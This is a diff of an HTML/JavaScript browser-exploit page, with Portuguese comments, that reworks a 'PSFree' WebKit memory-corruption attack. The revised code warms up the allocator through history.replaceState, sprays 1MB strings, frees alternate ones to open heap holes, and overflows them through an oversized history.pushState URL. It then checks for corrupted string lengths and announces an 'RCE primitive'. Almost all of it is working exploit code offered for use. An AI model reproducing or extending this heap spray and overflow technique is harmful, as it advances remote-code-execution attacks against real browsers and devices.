@@ -1,31 +1,32 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>PSFree Logic: Frameset Class Finder</title>
+    <title>PSFree: Primed 1MB Attack</title>
     <style>
         body { background-color: #000; color: #0f0; font-family: monospace; padding: 20px; }
-        button { 
-            font-size: 24px; padding: 20px; width: 100%; border: 2px solid #0f0; background: #111; color: #fff; cursor: pointer; margin-bottom: 15px;
-        }
-        #log { border: 1px solid #333; height: 400px; overflow-y: scroll; padding: 10px; color: cyan; font-size: 14px; }
-        .win { background-color: #00ff00; color: #000; font-weight: bold; font-size: 1.6em; padding: 10px; border: 4px solid white; }
+        button { font-size: 24px; padding: 20px; width: 100%; border: 2px solid #0f0; background: #111; color: #fff; cursor: pointer; }
+        #log { border: 1px solid #333; height: 400px; overflow-y: scroll; padding: 10px; color: cyan; font-size: 14px; margin-top: 20px;}
+        .win { background-color: #00ff00; color: #000; font-weight: bold; font-size: 1.5em; padding: 10px; border: 4px solid white;}
     </style>
 </head>
 <body>
 
-    <h1>Frameset Class Finder</h1>
-    <p>Usando a vítima do PSFree em tamanhos maiores (fastMalloc).</p>
+    <h1>PSFree: Primed 1MB Attack</h1>
+    <p>Reproduzindo a lógica de aquecimento e construção de string do original.</p>
 
-    <button onclick="runTest(16384)">TESTAR 16 KB</button>
-    <button onclick="runTest(32768)">TESTAR 32 KB</button>
-    <button onclick="runTest(65536)">TESTAR 64 KB</button>
-    <button onclick="runTest(131072)">TESTAR 128 KB</button>
+    <button onclick="startPrimedAttack()">INICIAR ATAQUE PREPARADO</button>
     
     <div id="log">Pronto. Reinicie o console.</div>
 
     <script>
+        // Offset que confirmamos que toca nos dados
         const BASE_OFFSET = 709520; 
-        const OVERFLOW_AMT = 1024 * 32; // 32KB de overflow é suficiente
+        const OVERFLOW_AMT = 1024 * 64; 
+
+        // 1MB Alinhado
+        const TARGET_SIZE = 1024 * 1024; 
+        // Header de StringImpl (24 bytes)
+        const PAYLOAD_SIZE = TARGET_SIZE - 24; 
 
         var victims = [];
 
@@ -36,105 +37,110 @@
             el.scrollTop = el.scrollHeight;
         }
 
-        async function runTest(targetBytes) {
-            log(`----------------------------------------`);
-            log(`INICIANDO TESTE: FRAMESET ${targetBytes / 1024} KB`);
+        function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
 
-            // 1. CÁLCULO REVERSO DO PSFREE
-            // Queremos que o objeto final na memória tenha 'targetBytes'.
-            // UniqueArray tem 8 bytes de header.
-            const dataBytes = targetBytes - 8;
-            const elements = dataBytes / 8;
-            const commas = elements - 1;
+        // Construtor de String estilo PSFree (Garante 8-bit flat string)
+        function createPSFreeString(size, index) {
+            // Cria um buffer de índices para identificação
+            const u32 = new Uint32Array(1);
+            u32[0] = index;
+            const u8 = new Uint8Array(u32.buffer);
             
-            const rowsString = ",".repeat(commas);
+            // Padding 'B'
+            // Deixamos 4 bytes no final para o índice
+            const padLen = size - 4; 
+            const pad = "B".repeat(padLen);
+            
+            // Junta tudo. Isso força o WebKit a criar uma string Flat.
+            return [pad, String.fromCodePoint(...u8)].join('');
+        }
 
-            log(`Gerando string com ${commas} vírgulas...`);
+        async function startPrimedAttack() {
+            log("--- FASE 0: AQUECIMENTO (WARMUP) ---");
+            
+            // 1. PRIMING (A parte que esquecemos)
+            // Aloca uma string de 1MB no histórico para "acordar" o alocador correto
+            let dummyPayload = "W".repeat(BASE_OFFSET + 100); 
+            history.replaceState("warmup", "warmup", "/" + dummyPayload);
+            
+            log("Alocador aquecido. Iniciando Spray...");
+            await sleep(100);
 
-            // 2. SPRAY
+            // 2. SPRAY (Estilo PSFree)
             victims = [];
-            // Spray denso para encher o fastMalloc
-            const SPRAY_COUNT = 400; 
+            const SPRAY_COUNT = 80;
 
             try {
                 for(let i=0; i<SPRAY_COUNT; i++) {
-                    let fset = document.createElement('frameset');
-                    fset.rows = rowsString;
-                    victims.push(fset);
+                    // Usa a função específica de construção
+                    let s = createPSFreeString(PAYLOAD_SIZE, i);
+                    victims.push(s);
                 }
 
                 // 3. BURACOS
-                log("Abrindo buracos no fastMalloc...");
+                log("Criando buracos...");
                 for(let i=0; i<SPRAY_COUNT; i+=2) {
-                    victims[i].rows = ""; 
                     victims[i] = null;
                 }
 
                 await forceGC();
 
                 // 4. EXPLOIT
-                log("Disparando Overflow...");
+                log("Disparando Overflow (709520)...");
                 setTimeout(() => {
                     try {
                         let buffer = "A".repeat(BASE_OFFSET);
-                        // Escrevemos 0x01. No frameset, isso vai sobrescrever o '_size'.
-                        // _size = 0x01010101... (Gigante)
                         buffer += "\x01".repeat(OVERFLOW_AMT);
                         
-                        history.pushState({}, "frameset_opt", "/" + buffer);
+                        history.pushState({}, "pwn", "/" + buffer);
 
-                        log("Verificando Framesets (OOM Detector)...");
-                        checkVictims();
+                        log("Verificando...");
+                        checkCorruption(PAYLOAD_SIZE);
 
                     } catch (e) {
-                        log("Erro JS: " + e.message);
+                        log("Erro: " + e.message);
                     }
                 }, 500);
 
             } catch(e) {
-                log("Erro de Alocação: " + e.message);
+                log("Erro Memória: " + e.message);
             }
         }
 
-        function checkVictims() {
-            let found = false;
+        function checkCorruption(expectedLen) {
+            let success = false;
             for(let i=1; i<victims.length; i+=2) {
-                let fset = victims[i];
-                if(!fset) continue;
+                let s = victims[i];
+                if(!s) continue;
 
                 try {
-                    // SE o tamanho foi corrompido para algo gigante,
-                    // acessar .rows vai tentar gerar uma string gigante.
-                    // Isso vai demorar muito ou dar erro de memória.
-                    
-                    let s = fset.rows;
+                    // TRUQUE DO ERROR
+                    let err = new Error(s);
+                    let msg = err.message;
 
-                    // Se leu rápido e o tamanho é normal, falhou.
-                    if (s.length > 0 && s.length < 10000000) {
-                        continue;
+                    // CHECAGEM DE LENGTH (RCE)
+                    if (msg.length !== expectedLen) {
+                        log(`!!! JACKPOT !!! String ${i} Length: ${msg.length}`, 'win');
+                        alert("RCE PRIMITIVE UNLOCKED!");
+                        success = true;
+                        break;
                     }
 
-                    // Se o tamanho ficou absurdo (maior que o original)
-                    log(`!!! ANOMALIA !!! Frameset ${i} retornou string enorme!`, 'win');
-                    alert("RCE PRIMITIVE: FRAMESET!");
-                    found = true;
-                    break;
-
-                } catch(e) {
-                    // SE DER ERRO AO LER, É VITÓRIA!
-                    // Significa que o tamanho era tão grande que o JS não conseguiu montar a string.
-                    log(`!!! JACKPOT !!! Erro ao ler Frameset ${i}: ${e.message}`, 'win');
-                    alert("RCE PRIMITIVE: FRAMESET CORRUPTED!");
-                    found = true;
-                    break;
-                }
+                    // CHECAGEM DE DADOS
+                    // PSFree verifica se os últimos bytes (o índice) mudaram, ou o começo
+                    if (msg.charCodeAt(0) !== 66) { 
+                        log(`[DADOS] String ${i} corrompida no início.`, 'win');
+                        success = true;
+                        break;
+                    }
+                } catch(e) {}
             }
-            if(!found) log("Nenhum frameset afetado.");
+            if(!success) log("Nada atingido.");
         }
 
         async function forceGC() {
             try { new ArrayBuffer(50 * 1024 * 1024); } catch(e){}
-            return new Promise(r => setTimeout(r, 600));
+            return new Promise(r => setTimeout(r, 800));
         }
     </script>
 </body>
